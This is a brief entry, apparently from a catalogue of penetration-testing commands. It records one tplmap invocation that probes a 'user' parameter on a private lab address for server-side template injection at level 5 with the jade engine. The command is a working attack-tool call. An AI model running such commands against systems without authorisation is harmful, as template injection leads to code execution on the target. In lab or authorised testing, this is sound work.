---
id: 8f14d1ee-c1b8-4d4a-867c-45bd7a010acc
name: tplmap - inject parameter with level and extension
type: command
executor: bash
data: python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link"
  --level 5 -e jade
output: null
created_at: '2023-04-06T03:56:38.834281+00:00'
updated_at: '2023-04-10T20:23:28.896426+00:00'
---

# tplmap - inject parameter with level and extension

```bash
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
